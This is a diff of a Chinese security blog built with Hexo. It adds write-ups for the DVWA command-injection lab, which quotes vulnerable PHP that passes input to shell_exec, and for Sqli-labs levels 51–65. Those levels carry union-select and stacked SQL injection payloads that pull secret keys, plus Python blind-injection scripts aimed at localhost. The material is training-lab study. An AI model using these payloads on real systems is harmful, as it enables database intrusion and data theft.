         <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\exec\source\</span><br></pre></td></tr></table></figure>
+<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>可以在我们输入一个IP地址之后，帮我们Ping这个地址并返回结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/2-0.png" alt="2-0"></p>
 <h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">	<span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Windows</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// *nix</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Feedback for the end user</span></span><br><span class="line">	$html .= <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><code>stristr()</code>函数：返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到结尾的字符串。</p>
@@ -750,7 +774,36 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/02/Sqli-labs%20%E7%AC%AC41-50%E5%85%B3/">第41-50关Write-up</a></p>
-<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2>
+<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>与前一关相同，单引号包裹，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&apos;;create table less51 like users--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>与Less-50相同，只不过没有报错信息回显，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table less51 like users--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>与Less-51相同，只不过没有报错信息回显，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&apos;;create table less51 like users--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>本关开始，又有了新类型的题目了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/51-65/4-1.png" alt="4-1"></p>
+<p>题目要求注出<code>secret key</code>，并且提交的次数有十次的限制，本关就先一次一次记录一下：</p>
+<p>①发现单引号包裹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=2&apos; or 1=1 --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:Dumb；Your Password:Dumb</span><br></pre></td></tr></table></figure>
+<p>②union联合查询成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:2;Your Password:3</span><br></pre></td></tr></table></figure>
+<p>③查询表名成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:2;Your Password:c4ukmmeokq</span><br></pre></td></tr></table></figure>
+<p>④查询列名成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;c4ukmmeokq&quot; --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:2;Your Password:id,sessid,secret_SAT4,tryy</span><br></pre></td></tr></table></figure>
+<p>⑤获取密钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,secret_SAT4 from c4ukmmeokq --+</span><br><span class="line"></span><br><span class="line">回显：Your Login name:2;Your Password:BlKuhIw2XDbdZWwN6f2W1cTm</span><br></pre></td></tr></table></figure>
+<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>与前一关一样，参数用<code>括号</code>包裹，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注表名</span><br><span class="line">?id=-1) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"></span><br><span class="line">#注列名</span><br><span class="line">?id=-1) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;jzxlk3kxz9&quot; --+</span><br><span class="line"></span><br><span class="line">#注密钥</span><br><span class="line">?id=-1) union select 1,2,secret_NGS3 from jzxlk3kxz9 --+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>与前一关一样，参数用<code>单引号+括号</code>包裹，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注表名</span><br><span class="line">?id=-1&apos;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"></span><br><span class="line">#注列名</span><br><span class="line">?id=-1&apos;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;0p9yfnr8tk&quot; --+</span><br><span class="line"></span><br><span class="line">#注密钥</span><br><span class="line">?id=-1&apos;) union select 1,2,secret_8QJV from 0p9yfnr8tk --+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>与前一关一样，参数用<code>双引号</code>包裹，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注表名</span><br><span class="line">?id=-1&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line"></span><br><span class="line">#注列名</span><br><span class="line">?id=-1&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;5w2mz645f4&quot; --+</span><br><span class="line"></span><br><span class="line">#注密钥</span><br><span class="line">?id=-1&quot; union select 1,2,secret_HD9O from 5w2mz645f4 --+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p><code>单引号</code>包裹，盲注，python代码只注数据库，不再多谢赘述</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/AAsqli-labs/Less-58/?id=1' and ascii(substr(database(),&#123;&#125;,1))=&#123;&#125; --+"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">125</span>):</span><br><span class="line">        payload = url.format(i,j)</span><br><span class="line">        r = requests.get(payload)</span><br><span class="line">        soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line">        match = re.findall(<span class="string">"Angelina"</span>,str(soup))</span><br><span class="line">        <span class="keyword">if</span>(match):</span><br><span class="line">            flag = flag + chr(j)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>
+<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>与前一关差不多，只不过没有参数没有包裹，<code>整形注入</code></p>
+<h2 id="Less-60-65"><a href="#Less-60-65" class="headerlink" title="Less-60-65"></a>Less-60-65</h2><p>类型都差不多，就不再详细讲解了</p>
+
       
 
       
@@ -854,7 +907,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(true)</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-1.png" alt="6-1"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(false)</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-1.png" alt="6-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-2.png" alt="6-2"></p>
 <p>现在就可以写一个python来爆破</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/AAsqli-labs/Less-46/"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#database</span></span><br><span class="line">database_payload = <span class="string">"?sort=rand(ascii(substr(&#123;&#125;,&#123;&#125;,1))=&#123;&#125;)"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">125</span>):</span><br><span class="line">        array = []</span><br><span class="line">        payload = database_payload.format(<span class="string">"database()"</span>,i,j)</span><br><span class="line">        r = requests.get(url=url+payload)        </span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">7</span>,<span class="number">3</span>):</span><br><span class="line">            soup = re.findall(<span class="string">"&gt;(.*)&lt;"</span>,str(BeautifulSoup(r.text,<span class="string">"lxml"</span>).select(<span class="string">"td"</span>)[m]))[<span class="number">0</span>]</span><br><span class="line">            array.append(soup)</span><br><span class="line">        <span class="keyword">if</span>(array[<span class="number">0</span>]==<span class="string">"11"</span> <span class="keyword">and</span> array[<span class="number">1</span>]==<span class="string">"5"</span> <span class="keyword">and</span> array[<span class="number">2</span>]==<span class="string">"4"</span>):</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">print(<span class="string">"The name of database: "</span> + database)</span><br><span class="line"></span><br><span class="line"><span class="comment">#table</span></span><br><span class="line">database = <span class="string">"security"</span></span><br><span class="line">table_array = []</span><br><span class="line">table_payload = <span class="string">"?sort=rand(ascii(substr((select table_name from information_schema.tables where table_schema=\"&#123;&#125;\" limit &#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;)"</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    table_name = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">96</span>,<span class="number">125</span>):</span><br><span class="line">            array = []</span><br><span class="line">            payload = table_payload.format(database,s,i,j)</span><br><span class="line">            r = requests.get(url=url+payload)        </span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">7</span>,<span class="number">3</span>):</span><br><span class="line">                soup = re.findall(<span class="string">"&gt;(.*)&lt;"</span>,str(BeautifulSoup(r.text,<span class="string">"lxml"</span>).select(<span class="string">"td"</span>)[m]))[<span class="number">0</span>]</span><br><span class="line">                array.append(soup)</span><br><span class="line">            <span class="keyword">if</span>(array[<span class="number">0</span>]==<span class="string">"11"</span> <span class="keyword">and</span> array[<span class="number">1</span>]==<span class="string">"5"</span> <span class="keyword">and</span> array[<span class="number">2</span>]==<span class="string">"4"</span>):</span><br><span class="line">                table_name = table_name + chr(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    table_array.append(table_name)</span><br><span class="line">set = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table_array:</span><br><span class="line">    print(<span class="string">"The table of "</span> + database + <span class="string">": "</span> + str(set) + <span class="string">"."</span> + str(i) + <span class="string">" "</span>)</span><br><span class="line">    set = set + <span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>等待之后就可以得出结果</p>
@@ -877,7 +930,7 @@
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/9-1.png" alt="9-1"></p>
 <h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>本关开始，考察的是<code>order by注入</code>+<code>堆叠注入</code>，使用<code>mysqli_multi_query()</code>函数，前面关卡已经讲解过，不再赘述</p>
 <p>至此，41-50关的Write-up结束</p>
-<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/03/Sqli-labs%20%E7%AC%AC51-65%E5%85%B3/">第51-60关Write-up</a></p>
+<p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/03/Sqli-labs%20%E7%AC%AC51-65%E5%85%B3/">第51-60关Write-up</a>Less-51</p>
 
       
 
@@ -1528,11 +1581,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1540,11 +1593,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Kali系统</a>
+                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
+                <a href="javascript:void(0)" class="js-tag color2">Kali系统</a>
               </li>
              
               <li class="article-tag-list-item">
